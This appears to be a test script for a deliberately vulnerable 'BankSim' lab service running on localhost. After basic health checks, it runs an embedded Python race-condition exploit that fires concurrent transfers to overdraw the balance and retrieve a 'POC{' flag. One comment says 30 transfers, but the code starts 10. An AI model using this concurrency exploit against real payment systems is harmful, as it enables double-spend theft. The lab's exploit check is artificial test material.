#!/usr/bin/env bash
set -e
DC=$(docker compose version &>/dev/null && echo "docker compose" || echo "docker-compose")

$DC down 2>/dev/null || true
$DC up --build -d
trap "$DC down" EXIT
sleep 3

# 1. Home page responds
OUT=$(curl -sf "http://localhost:8080/")
if echo "$OUT" | grep -q "BankSim"; then
  echo "[+] PASS: service responds"
else
  echo "[-] FAIL: home: $OUT"; exit 1
fi

# 2. Balance starts at 10
OUT=$(curl -sf "http://localhost:8080/balance")
if echo "$OUT" | grep -q '"balance": 10'; then
  echo "[+] PASS: initial balance is 10"
else
  echo "[-] FAIL: balance: $OUT"; exit 1
fi

# 3. Single transfer succeeds
OUT=$(curl -sf -X POST "http://localhost:8080/transfer?amount=5")
if echo "$OUT" | grep -q '"transferred": 5'; then
  echo "[+] PASS: single transfer succeeds"
else
  echo "[-] FAIL: single transfer: $OUT"; exit 1
fi

# 4. Reset by depositing enough to race
curl -sf -X POST "http://localhost:8080/deposit?amount=100" > /dev/null

# 5. Race condition: 30 concurrent transfers drive balance below -50
python3 - << 'PYEOF'
import json, threading, urllib.request, sys

BASE = "http://localhost:8080"

def post(path):
    req = urllib.request.Request(f"{BASE}{path}", data=b"", method="POST")
    try:
        with urllib.request.urlopen(req) as r:
            return json.loads(r.read())
    except urllib.request.HTTPError as e:
        return json.loads(e.read())

barrier = threading.Barrier(10)

def race():
    barrier.wait()
    post("/transfer?amount=50")

threads = [threading.Thread(target=race) for _ in range(10)]
for t in threads: t.start()
for t in threads: t.join()

with urllib.request.urlopen(f"{BASE}/balance") as r:
    final = json.loads(r.read())

bal = final["balance"]
flag = final.get("flag", "")
if flag and flag.startswith("POC{"):
    print(f"[+] PASS: race drove balance to {bal}, flag={flag}")
else:
    print(f"[-] FAIL: balance={bal}, flag={flag!r}")
    sys.exit(1)
PYEOF

echo "[+] All tests passed"
